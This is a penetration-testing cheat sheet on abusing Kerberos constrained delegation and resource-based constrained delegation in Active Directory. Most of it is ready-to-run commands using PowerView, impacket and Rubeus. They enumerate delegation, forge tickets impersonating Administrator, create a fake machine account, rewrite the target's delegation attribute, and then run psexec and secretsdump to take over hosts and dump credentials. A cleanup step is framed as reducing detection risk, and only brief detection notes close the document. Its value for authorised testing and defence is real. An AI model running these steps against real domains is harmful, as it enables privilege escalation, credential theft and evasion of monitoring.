# Constrained Delegation

Constrained Delegation is a Kerberos feature that allows a service account to impersonate users, but only when accessing a specific set of pre-approved services. It was introduced as a safer alternative to Unconstrained Delegation — but misconfigured or overly permissive constrained delegation settings still create exploitable attack paths.

The key difference from Unconstrained Delegation: the impersonation is restricted to specific SPNs defined in the `msDS-AllowedToDelegateTo` attribute.

---

## Two Variants

| Variant | Description | Requires |
|---|---|---|
| Classic Constrained Delegation | Service can impersonate users to access specific SPNs | Service must receive a forwardable TGS first |
| Resource-Based Constrained Delegation (RBCD) | Target resource controls who can delegate to it | Write access to target's `msDS-AllowedToActOnBehalfOfOtherIdentity` |

---

## Enumeration

### Find Accounts with Constrained Delegation Configured

```powershell
# PowerView — find users with delegation set
Get-DomainUser -TrustedToAuth

# PowerView — find computers with delegation set
Get-DomainComputer -TrustedToAuth

# Native PowerShell — users
Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} `
  -Properties TrustedForDelegation, TrustedToAuthForDelegation, msDS-AllowedToDelegateTo

# Native PowerShell — computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} `
  -Properties TrustedForDelegation, TrustedToAuthForDelegation, msDS-AllowedToDelegateTo

# Check a specific account's delegation targets
Get-ADUser -Identity <service_account> -Properties msDS-AllowedToDelegateTo |
  Select-Object Name, msDS-AllowedToDelegateTo
```

### Find with impacket

```bash
# Find all accounts with constrained delegation from Kali
impacket-findDelegation <domain>/<username>:<password> -dc-ip <dc_ip>
```

### BloodHound Query

```
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u,c
```

---

## Classic Constrained Delegation Attack

### Requirements
- Credentials or NT hash of the delegating service account
- The service account has SPNs listed in `msDS-AllowedToDelegateTo`

### Step 1 — Request a TGT for the Service Account

```bash
# From Kali using cleartext password
impacket-getTGT <domain>/<service_account>:<password> -dc-ip <dc_ip>

# Using NT hash (Pass-the-Hash)
impacket-getTGT <domain>/<service_account> -hashes :<NT_hash> -dc-ip <dc_ip>

# Export the ticket
export KRB5CCNAME=<service_account>.ccache
```

### Step 2 — Impersonate a Privileged User to the Target Service

```bash
# Request a TGS impersonating Administrator to the allowed SPN
impacket-getST -spn <allowed_spn> \
  -impersonate Administrator \
  -dc-ip <dc_ip> \
  <domain>/<service_account>:<password>

# Example — service account allowed to delegate to cifs/fileserver.domain.com
impacket-getST -spn cifs/fileserver.domain.com \
  -impersonate Administrator \
  -dc-ip 192.168.1.10 \
  domain.com/svc_backup:Password123

# Using NT hash
impacket-getST -spn <allowed_spn> \
  -impersonate Administrator \
  -hashes :<NT_hash> \
  -dc-ip <dc_ip> \
  <domain>/<service_account>
```

### Step 3 — Use the Impersonated Ticket

```bash
export KRB5CCNAME=Administrator@<spn>@<domain>.ccache

# Access the target service as Administrator
impacket-smbclient -k -no-pass <domain>/Administrator@<target_host>
impacket-psexec -k -no-pass <domain>/Administrator@<target_host>
impacket-secretsdump -k -no-pass <domain>/Administrator@<dc_host>
```

---

## Resource-Based Constrained Delegation (RBCD)

RBCD flips the model — instead of the delegating account controlling where it can go, the *target* resource controls who can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

### Requirements
- Write access to the target computer object (`GenericWrite`, `GenericAll`, or `WriteDACL`)
- Ability to create or control a machine account (default domain users can create up to 10)

### Step 1 — Create a Fake Machine Account

```bash
# From Kali
impacket-addcomputer <domain>/<username>:<password> \
  -computer-name 'FAKEMACHINE$' \
  -computer-pass 'FakePass123!' \
  -dc-ip <dc_ip>
```

```powershell
# From Windows using PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
```

### Step 2 — Configure RBCD on the Target

```powershell
# PowerView — set RBCD on the target computer to allow FAKEMACHINE$ to delegate
$fakeSID = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <target_computer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```bash
# From Kali using impacket
impacket-rbcd -action write \
  -delegate-from 'FAKEMACHINE$' \
  -delegate-to '<target_computer$>' \
  -dc-ip <dc_ip> \
  '<domain>/<username>:<password>'
```

### Step 3 — Get a TGT for the Fake Machine Account

```bash
impacket-getTGT <domain>/FAKEMACHINE$ -dc-ip <dc_ip> -password 'FakePass123!'
export KRB5CCNAME=FAKEMACHINE$.ccache
```

### Step 4 — Impersonate Administrator to the Target

```bash
impacket-getST \
  -spn cifs/<target_computer>.<domain> \
  -impersonate Administrator \
  -dc-ip <dc_ip> \
  <domain>/'FAKEMACHINE$':'FakePass123!'
```

### Step 5 — Access the Target as Administrator

```bash
export KRB5CCNAME=Administrator@cifs_<target_computer>.<domain>@<domain>.ccache

impacket-psexec -k -no-pass <domain>/Administrator@<target_computer>.<domain>
impacket-secretsdump -k -no-pass <domain>/Administrator@<target_computer>.<domain>
```

---

## Rubeus (Windows — Classic Constrained Delegation)

```powershell
# Request TGT for the service account
Rubeus.exe asktgt /user:<service_account> /rc4:<NT_hash> /domain:<domain> /nowrap

# S4U2Self — get a TGS for the service account impersonating a user
Rubeus.exe s4u /ticket:<base64_TGT> /impersonateuser:Administrator /nowrap

# S4U2Proxy — get a TGS for the target SPN
Rubeus.exe s4u /ticket:<base64_TGT> \
  /impersonateuser:Administrator \
  /msdsspn:<allowed_spn> \
  /nowrap

# Inject the final ticket
Rubeus.exe ptt /ticket:<base64_TGS>
```

---

## Cleanup (RBCD)

Remove the RBCD configuration after the attack to reduce detection risk:

```bash
impacket-rbcd -action remove \
  -delegate-from 'FAKEMACHINE$' \
  -delegate-to '<target_computer$>' \
  -dc-ip <dc_ip> \
  '<domain>/<username>:<password>'
```

---

## Detection Notes

- Event ID 4769 — unusual S4U2Self or S4U2Proxy ticket requests
- Unexpected modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- New machine account creation followed by RBCD configuration is a strong indicator
- BloodHound path: look for `AllowedToDelegate` and `AllowedToAct` edges pointing to high-value targets